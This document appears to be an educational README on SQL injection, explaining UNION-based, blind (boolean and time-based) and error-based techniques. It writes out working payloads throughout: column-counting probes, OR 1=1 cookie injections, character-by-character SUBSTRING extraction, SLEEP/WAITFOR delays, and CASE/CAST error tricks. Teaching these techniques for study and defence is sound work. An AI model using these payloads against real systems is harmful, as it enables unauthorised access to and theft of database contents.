# SQL Injection

## What is SQL Injection?

SQL Injection is a code injection attack that allows an attacker to manipulate a database through user input. An attacker may be able to view sensitive data, modify existing data, insert new data, or delete data.

## Types of SQL Injection

This repository covers the following SQL Injection techniques:

- UNION-Based SQL Injection
- Blind SQL Injection
- Error-Based SQL Injection

---

# UNION-Based SQL Injection

## What is UNION?

`UNION` is used to combine the results of two or more SQL queries into a single result set. Both queries must return the same number of columns.

Example:

```sql
SELECT x, y FROM table1
UNION
SELECT z, t FROM table2;
```

## What is UNION-Based SQL Injection?

UNION-Based SQL Injection allows an attacker to retrieve data from other tables by adding a new query to the original SQL statement. This technique is commonly used to access sensitive information such as usernames and passwords.

## How Does It Work?

Suppose the application contains the following SQL query:

```php
$title = $_GET["title"];

SELECT * FROM movies WHERE title LIKE '%" . $title . "%';
```

As attackers, we do not know the original SQL query. We can only test how our input is handled.

If the input is:

```text
abc
```

The SQL query becomes:

```sql
SELECT * FROM movies WHERE title LIKE '%abc%';
```

If the input is changed to:

```text
abc'
```

The SQL query becomes:

```sql
SELECT * FROM movies WHERE title LIKE '%abc'%';
```

Because the single quote (`'`) closes the original string, the SQL query becomes invalid and returns a syntax error. This may indicate an SQL Injection vulnerability.

## Finding the Number of Columns

After identifying the vulnerability, the next step is to determine how many columns are returned by the original query.

### Method 1 – ORDER BY

Increase the column number until an SQL error is returned.

```sql
' ORDER BY 1--
```

```sql
' ORDER BY 2--
```

```sql
' ORDER BY 3--
```

```sql
' ORDER BY 4--
```

If an error appears with `ORDER BY 4`, the original query returns **3 columns**.

### Method 2 – UNION SELECT NULL

Add one `NULL` value at a time until the SQL error disappears.

```sql
' UNION SELECT NULL--
```

```sql
' UNION SELECT NULL, NULL--
```

```sql
' UNION SELECT NULL, NULL, NULL--
```

```sql
' UNION SELECT NULL, NULL, NULL, NULL--
```

When the SQL error no longer appears, the correct number of columns has been found.

# Blind SQL Injection

## What is Blind SQL Injection?

Blind SQL Injection is a type of SQL Injection where the application does not display database errors or query results directly. Instead, an attacker analyzes the application's responses to extract information from the database.

There are two common types of Blind SQL Injection:

- Boolean-Based Blind SQL Injection
- Time-Based Blind SQL Injection

---

## Boolean-Based Blind SQL Injection

Boolean-Based Blind SQL Injection works by sending different conditions to the database and observing the application's response.

For example, suppose the application uses the following cookie:

```text
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

The application checks whether the `TrackingId` exists by executing a query like this:

```sql
SELECT TrackingId
FROM TrackedUsers
WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4';
```

If this query is vulnerable to SQL Injection, the application's response changes depending on whether the query returns a result.

- If the `TrackingId` is valid, the application displays **"Welcome back"**.
- If the `TrackingId` is invalid, the application returns a different response.

An attacker can modify the SQL query and observe these responses.

For example:

```text
TrackingId=abc' OR 1=1--
```

The `TrackingId` does not exist, but the condition `1=1` is always true. As a result, the application displays **"Welcome back"**.

Another example:

```text
TrackingId=abc' OR 1=2--
```

In this case, both conditions are false, so the application returns a different response.

After confirming the vulnerability, the attacker can use the `SUBSTRING()` function to extract information one character at a time.

Example:

```text
TrackingId=u5YD3PapBcR4lN3e7Tj4' OR (SELECT SUBSTRING(database(),1,1))='a'--
```

This query checks whether the first character of the database name is **"a"**.

- If the application returns **"Welcome back"**, the first character is **"a"**.
- Otherwise, the first character is different.

By repeating this process, the database name, usernames, or passwords can be extracted one character at a time.

### What is the SUBSTRING() Function?

`SUBSTRING()` is used to extract part of a string.

Syntax:

```sql
SUBSTRING(text, start, length)
```

Examples:

```sql
SUBSTRING(password,1,1)
```

Result:

```text
p
```

```sql
SUBSTRING(password,2,1)
```

Result:

```text
a
```

```sql
SUBSTRING(password,2,4)
```

Result:

```text
assw
```

---

## Time-Based Blind SQL Injection

Time-Based Blind SQL Injection determines whether a condition is true by measuring the server's response time.

The `SLEEP()` function is commonly used for this purpose.

Example:

```text
TrackingId=u5YD3PapBcR4lN3e7Tj4' OR IF(1=1,SLEEP(5),0)--
```

If the response is delayed by **5 seconds**, the condition is true.

Microsoft SQL Server uses the `WAITFOR DELAY` statement instead.

Example:

```text
TrackingId=u5YD3PapBcR4lN3e7Tj4'; IF(1=1) WAITFOR DELAY '0:0:10'--
```

If the response is delayed by **10 seconds**, the condition is true.


# Error-Based SQL Injection

## What is Error-Based SQL Injection?

Error-Based SQL Injection is a type of SQL Injection where an attacker uses database error messages to retrieve sensitive information.

This section demonstrates one common technique.

### Division by Zero → `CASE` Statement

This technique generates a database error by dividing a number by zero.

Examples:

```text
abc' AND 1=1
```

The query executes normally because the condition is true.

```text
abc' AND 1=0
```

The query returns no result, but no error is generated.

```text
abc' AND (1/0)
```

A database error is generated because division by zero is not allowed.

---

## What is the `CASE` Statement?

The `CASE` statement is used to create conditional expressions in SQL. It works like an **if/else** statement.

Syntax:

```sql
CASE
    WHEN condition THEN result1
    ELSE result2
END
```

### Example 1

```text
TrackingId=abc' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a'--
```

The condition `1=2` is false, so the `ELSE` statement is executed.

The query becomes:

```text
'a' = 'a'
```

The application responds normally because no error is generated.

### Example 2

```text
TrackingId=abc' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a'--
```

The condition `1=1` is true, so the `THEN` statement is executed.

The expression `1/0` causes a database error.

The application may return an error message or respond differently, confirming that the injected condition is true.

### Invalid Type Conversion → `CAST()` Function

This technique generates a database error by forcing data to be converted to an incompatible data type.

## What is the `CAST()` Function?

The `CAST()` function is used to convert one data type into another.

Syntax:

```sql
CAST(expression AS data_type)
```

Example:

```text
abc' AND (SELECT CAST((SELECT database()) AS INT))--
```

In this example, the database name is converted to an integer.

Since the database name is text, it cannot be converted to an integer. This causes a database error.

The error message may reveal the database name, allowing an attacker to extract sensitive information.